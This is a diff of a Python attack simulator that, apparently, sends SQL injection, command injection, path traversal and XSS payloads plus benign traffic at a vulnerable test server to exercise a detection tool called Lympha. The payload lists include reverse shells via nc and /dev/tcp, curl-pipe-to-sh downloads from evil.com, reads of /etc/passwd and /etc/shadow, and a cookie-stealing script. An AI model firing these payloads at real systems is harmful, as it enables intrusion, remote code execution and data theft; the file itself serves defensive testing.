@@ -1,98 +1,206 @@
-"""
-Attack simulator — generates traffic against the vuln_server to test Lympha.
+from __future__ import annotations
 
-Usage:
-  python3 test/attack.py [target] [port]
+import json
+import random
 
-Examples:
-  python3 test/attack.py                        # http://localhost:8080
-  python3 test/attack.py 192.168.1.100 80       # remote target
-"""
+# ── SQL Injection ────────────────────────────────────────────────
 
-import sys
-import urllib.request
-import urllib.parse
+SQLI_PAYLOADS = [
+    {"user": "' OR '1'='1", "pass": "' OR '1'='1"},
+    {"user": "admin' --", "pass": "anything"},
+    {"user": "admin'/*", "pass": "*/ OR '1'='1"},
+    {"user": "' UNION SELECT * FROM users --", "pass": "x"},
+    {"user": "'; DROP TABLE users; --", "pass": "x"},
+    {"user": "' OR 1=1 --", "pass": "x"},
+    {"user": "admin\" OR \"1\"=\"1", "pass": "x"},
+    {"user": "\\'; EXEC xp_cmdshell('whoami') --", "pass": "x"},
+]
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
-PORT = sys.argv[2] if len(sys.argv) > 2 else "80"
-BASE = f"http://{TARGET}:{PORT}"
-COUNT = 1
+# ── Command Injection / RCE ─────────────────────────────────────
+
+RCE_PAYLOADS = [
+    "127.0.0.1; whoami",
+    "127.0.0.1 | id",
+    "127.0.0.1 && cat /etc/passwd",
+    "127.0.0.1`uname -a`",
+    "$(whoami).example.com",
+    "127.0.0.1 | nc -e /bin/sh attacker.com 4444",
+    "127.0.0.1; curl http://evil.com/payload.sh | sh",
+    "127.0.0.1 & ping -c 1000 127.0.0.1 &",
+]
+
+# ── Path Traversal ──────────────────────────────────────────────
+
+PATH_TRAVERSAL_PAYLOADS = [
+    "../../etc/passwd",
+    "../../../etc/shadow",
+    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "../../../../../../etc/passwd",
+]
+
+# ── XSS ─────────────────────────────────────────────────────────
+
+XSS_PAYLOADS = [
+    "<script>alert('xss')</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "javascript:alert(document.cookie)",
+    "\"><script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
+]
+
+# ── Benign Traffic ──────────────────────────────────────────────
+
+BENIGN_USERS = ["alice", "bob", "charlie", "dave", "eve"]
+BENIGN_PASSWORDS = ["password123", "welcome1", "letmein", "qwerty123", "admin123"]
+BENIGN_SEARCHES = ["hello world", "python tutorial", "how to code", "news today"]
+BENIGN_HOSTS = ["google.com", "cloudflare.com", "github.com", "localhost"]
 
 
-def req(method, path, body=None, headers=None):
-    url = f"{BASE}{path}"
-    if isinstance(body, bytes):
-        data = body
-    elif body:
-        data = urllib.parse.urlencode(body).encode()
-    else:
-        data = None
-    hdrs = headers or {}
-    hdrs.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
-    req_obj = urllib.request.Request(url, data=data, headers=hdrs, method=method)
+def sql_injection_attacks() -> list[dict]:
+    return [
+        {"type": "sql_injection", "method": "POST", "path": "/login", "body": json.dumps(p)}
+        for p in SQLI_PAYLOADS
+    ]
+
+
+def rce_attacks() -> list[dict]:
+    return [
+        {"type": "rce", "method": "GET", "path": "/ping", "query": f"host={p}"}
+        for p in RCE_PAYLOADS
+    ]
+
+
+def path_traversal_attacks() -> list[dict]:
+    return [
+        {"type": "path_traversal", "method": "GET", "path": "/file", "query": f"name={p}"}
+        for p in PATH_TRAVERSAL_PAYLOADS
+    ]
+
+
+def xss_attacks() -> list[dict]:
+    return [
+        {"type": "xss", "method": "GET", "path": "/search", "query": f"q={p}"}
+        for p in XSS_PAYLOADS
+    ]
+
+
+def benign_requests(n: int = 10) -> list[dict]:
+    requests: list[dict] = []
+    for i in range(n):
+        choice = random.choice(["login", "search", "ping", "home"])
+        if choice == "login":
+            requests.append({
+                "type": "benign_login",
+                "method": "POST",
+                "path": "/login",
+                "body": json.dumps({
+                    "user": random.choice(BENIGN_USERS),
+                    "pass": random.choice(BENIGN_PASSWORDS),
+                }),
+            })
+        elif choice == "search":
+            requests.append({
+                "type": "benign_search",
+                "method": "GET",
+                "path": "/search",
+                "query": f"q={random.choice(BENIGN_SEARCHES)}",
+            })
+        elif choice == "ping":
+            requests.append({
+                "type": "benign_ping",
+                "method": "GET",
+                "path": "/ping",
+                "query": f"host={random.choice(BENIGN_HOSTS)}",
+            })
+        else:
+            requests.append({
+                "type": "benign_home",
+                "method": "GET",
+                "path": "/",
+                "query": "",
+            })
+    return requests
+
+
+def all_attacks() -> list[dict]:
+    attacks: list[dict] = []
+    attacks.extend(sql_injection_attacks())
+    attacks.extend(rce_attacks())
+    attacks.extend(path_traversal_attacks())
+    attacks.extend(xss_attacks())
+    return attacks
+
+
+def all_benign() -> list[dict]:
+    return benign_requests(15)
+
+
+def send_sync(url: str, req: dict) -> str:
+    import urllib.request
+    import urllib.parse
+
+    full = f"{url}{req['path']}"
+    if req.get("query"):
+        q = req["query"]
+        if "=" in q:
+            k, v = q.split("=", 1)
+            full = f"{full}?{k}={urllib.parse.quote(v, safe='')}"
+        else:
+            full = f"{full}?{urllib.parse.quote(q, safe='')}"
+    data = req["body"].encode() if req.get("body") else None
     try:
-        resp = urllib.request.urlopen(req_obj, timeout=5)
-        print(f"  {method:4s} {path:30s} -> {resp.status}")
-        return resp
-    except urllib.error.HTTPError as e:
-        print(f"  {method:4s} {path:30s} -> {e.code}")
-        return e
+        r = urllib.request.urlopen(
+            urllib.request.Request(full, data=data, headers={"User-Agent": "LymphaAttack/1.0"}),
+            timeout=5,
+        )
+        return r.read().decode()[:80]
+    except Exception as e:
+        return f"ERR: {e}"
 
 
-def section(title):
-    print(f"\n── {title} ──")
+def main() -> None:
+    import sys
+    import time
+
+    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
+    print(f"Attacking {target}")
+
+    types = {
+        "sqli": sql_injection_attacks,
+        "rce": rce_attacks,
+        "path": path_traversal_attacks,
+        "xss": xss_attacks,
+    }
+
+    if len(sys.argv) > 2:
+        selected = sys.argv[2].split(",")
+    else:
+        selected = list(types.keys())
+
+    print(f"Payload types: {', '.join(selected)}")
+    print()
+
+    for t in selected:
+        if t not in types:
+            print(f"  Unknown type '{t}', skipping")
+            continue
+        payloads = types[t]()
+        print(f"  [{t}] sending {len(payloads)} payloads...")
+        for p in payloads:
+            resp = send_sync(target, p)
+            print(f"    {p['method']} {p['path']} -> {resp}")
+            time.sleep(0.1)
+
+    print("\n  Sending benign traffic...")
+    for b in benign_requests(5):
+        resp = send_sync(target, b)
+        print(f"    {b['method']} {b['path']} -> {resp}")
+        time.sleep(0.05)
+
+    print("\n  Done.")
 
 
-# -- Normal traffic -----------------------------------------------------------
-
-section("Normal traffic")
-
-req("GET", "/")
-req("GET", "/api/v2/user/profile", headers={"Authorization": "Bearer valid_token"})
-req("POST", "/login", {"user": "alice", "pass": "s3cret"})
-req("POST", "/api/v2/user/profile", {"email": "alice@test.com", "bio": "hello"})
-req("GET", "/search?q=hello+world")
-req("POST", "/exec", {"cmd": "whoami"})
-req("POST", "/upload", headers={"X-Filename": "readme.txt"}, body=b"hello data")
-
-# -- Suspicious traffic -------------------------------------------------------
-
-section("SQL injection attempts")
-
-for _ in range(COUNT):
-    req("GET", '/search?q=1%27+OR+%271%27%3D%271')
-    req("GET", '/search?q=' + urllib.parse.quote("' UNION SELECT * FROM users--"))
-    req("GET", '/search?q=' + urllib.parse.quote("admin' --"))
-
-section("Command injection")
-
-for _ in range(COUNT):
-    req("POST", "/exec", {"cmd": "; ls -la /etc"})
-    req("POST", "/exec", {"cmd": "id; wget http://evil.com/payload"})
-    req("POST", "/exec", {"cmd": "| bash -i >& /dev/tcp/attacker/4444 0>&1"})
-
-section("Path traversal")
-
-for _ in range(COUNT):
-    req("GET", "/../../etc/passwd")
-    req("GET", "/api/../../../proc/self/environ")
-
-section("XSS attempts")
-
-for _ in range(COUNT):
-    req("GET", '/search?q=' + urllib.parse.quote("<script>alert('xss')</script>"))
-    req("POST", "/api/v2/user/profile",
-        {"email": "xss@test.com", "bio": "<img src=x onerror=alert(1)>"})
-
-section("Brute-force login simulation")
-
-for _ in range(COUNT * 5):
-    req("POST", "/login", {"user": "admin", "pass": "wrong"})
-
-section("Suspicious headers / recon")
-
-req("GET", "/", headers={"User-Agent": "curl/7.88.1"})
-req("GET", "/", headers={"User-Agent": "Go-http-client/2.0"})
-req("GET", "/api/v2/user/profile", headers={"Authorization": "Bearer eyJ0eXAiOiJKV1Qi"})
-
-print("\nDone.")
+if __name__ == "__main__":
+    main()
